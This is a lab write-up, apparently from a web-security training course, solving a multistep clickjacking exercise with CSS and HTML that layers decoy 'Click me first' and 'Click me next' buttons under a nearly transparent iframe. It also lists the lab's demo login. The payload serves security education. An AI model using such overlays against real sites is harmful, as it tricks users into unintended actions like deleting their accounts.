Lab #5: Multistep clickjacking

Target: Call the print javascript function

    This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. 


Hint: 
    To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. 
    You will need to use two elements for this lab.

    You can log in to the account yourself using the following credentials: wiener:peter

Analysis:

       You have to frame the my_account page and put the "first click me" button on delete account,
       when the user clicks on it the frame is updated into the confirmation page, you should have put the "next click on me" button to be on the confirmation button on the new loaded frame.
       Since there is a csrf token, we cannot load both delete pages at once.
       
       solution:

            <style>
                iframe {

                    position: relative; 
                    height: 1000px; 
                    width: 700px;
                    opacity: 0.1;
                    z-index: 2;
                }
                .first{
                    position:absolute;
                    top:500px;
                    left:70px;
                    z-index: 1;
                }

            .next{
                    position:absolute;
                    top:290px;
                    left:200px;
                    z-index: 1;
                }
            </style>

            <div class="first">Click me first</div>
            <div class="next">Click  me next</div>
